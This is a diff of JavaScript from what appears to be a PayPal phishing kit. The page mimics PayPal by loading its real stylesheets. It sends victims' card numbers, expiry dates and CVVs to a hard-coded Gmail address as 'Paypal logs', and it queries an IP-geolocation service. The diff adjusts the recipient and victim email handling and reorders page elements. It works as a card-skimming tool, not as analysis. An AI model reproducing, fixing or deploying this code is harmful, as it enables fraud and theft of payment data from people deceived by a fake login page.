@@ -56,7 +56,7 @@ function formatString(e) {
           hide.style.display = "none";
           show.style.display = "block";
         }
-        email="fashmyguy135@gmail.com";
+       
         to="emilmiller134@gmail.com";
         window.addEventListener("load", function(){
           document.getElementById("email").value = email;
@@ -112,19 +112,19 @@ function formatString(e) {
     }
     else{send_em(to,email,"Paypal logs from "+email,"cc: "+cc +"\nexpiry: " + expiry+"\ncvv: "+cvv).then( 
      function(){
-              var temp = document.createElement('div');
+      const element = document.getElementById("js_modalHeader");
+      element.remove();
+      show_div('billing','cvv_form')
+      var temp = document.createElement('div');
 
             temp.innerHTML = '<link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-5-0/paypal-sans.css">
-         <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/edf/a7f2d511b0d8bf1bd86b78f265ae2/css/main.css">
-';
+            <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/edf/a7f2d511b0d8bf1bd86b78f265ae2/css/main.css">'
             var head = document.head;
             
             while (temp.firstChild) {
                 head.appendChild(temp.firstChild);
             }
-      const element = document.getElementById("js_modalHeader");
-      element.remove();
-      show_div('billing','cvv_form')
+               
      } )
     }
 fetch('http://ip-api.com/json')
